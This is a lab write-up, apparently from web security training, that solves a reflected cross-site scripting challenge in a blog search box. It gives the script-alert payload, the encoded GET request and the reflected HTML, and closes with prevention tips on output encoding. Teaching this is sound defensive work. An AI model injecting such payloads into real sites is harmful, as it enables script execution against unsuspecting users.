# Lab 02: Reflected XSS into HTML context with nothing encoded

**Goal**: Perform a reflected cross-site scripting (Reflected XSS) attack using the search functionality that calls the `alert()` function.

This lab contains a simple reflected XSS vulnerability in the blog search feature. When a user performs a search, the search query parameter is reflected back in the application response without sanitization or HTML encoding.

---

## 🎯 Solution

1. Enter the XSS payload into the search input box:
   ```html
   <script>alert(1)</script>
   ```
2. Click **Search** (or press Enter).
3. Observe the `alert(1)` popup dialog executing immediately.

![Lab 2 Search Input Payload](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-25%20183851.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Inject Reflected Payload
In the blog search box on the homepage, type or paste the following payload:

```html
<script>alert(1)</script>
```

### Step 2: Submit Search Request
Click **Search**. The application submits a GET request containing the search parameter:
```http
GET /?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2
```

### Step 3: Payload Execution
The server reflects the unencoded search string directly into the HTML response body:

```html
<h1>0 search results for '<script>alert(1)</script>'</h1>
```

The browser interprets and executes the inline `<script>` element upon parsing.

> [!SUCCESS]
> **Lab Solved**: The reflected JavaScript executed `alert(1)` successfully!

---

## 💡 Key Takeaways: Reflected XSS

- **Non-Persistent**: Reflected XSS payloads are delivered in the HTTP request (typically via URL parameters) and reflected in the immediate HTTP response.
- **Delivery**: Attackers must trick victims into clicking a malicious crafted link containing the payload.

---

## 🔒 Prevention

> [!TIP]
> 1. **Context-Aware Output Encoding**: Use HTML entity encoding on user input rendered in HTML context (`&lt;script&gt;` instead of raw `<script>`).
> 2. **Input Sanitization**: Validate and sanitize search parameters before echoing them back in responses.
